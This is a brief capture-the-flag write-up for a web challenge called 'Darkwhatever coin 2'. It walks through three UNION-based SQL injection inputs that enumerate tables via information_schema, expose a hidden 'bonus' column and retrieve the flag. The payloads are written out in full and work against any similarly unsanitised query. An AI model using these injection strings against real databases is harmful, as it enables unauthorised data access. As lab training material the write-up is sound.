# Darkwhatever coin 2
http://chal.firebird.sh:32001/q2/

1. Try some input: team1' or 1=1 or teamname=team2'
![alt text](https://github.com/div1121/OIL_Test/blob/main/Darkwhatever_coin_2/img1.png)

- After the input, we can see the table
- From the page source code, the flag is moved to neighbour, probably we need to the columns in this table or the flag is in another

2. Attempt for SQL injection for finding all tables in the database (UNION can be a good choice)
- Input: team1' UNION SELECT COLUMN_NAME, table_name FROM information_schema.columns UNION SELECT teamname, balance from balances where 1='1
![alt text](https://github.com/div1121/OIL_Test/blob/main/Darkwhatever_coin_2/img2.png)

- After the input, we can see balances table also has the bonus column

3. Attempt to see the bonus column in the balances table
- Input: team1' UNION SELECT teamname, bonus FROM balances UNION SELECT teamname, balance from balances where 1='1
![alt text](https://github.com/div1121/OIL_Test/blob/main/Darkwhatever_coin_2/img3.png)

Flag obtained:
flag{un10n_bas3d_sql1_attack_1s_f0n}
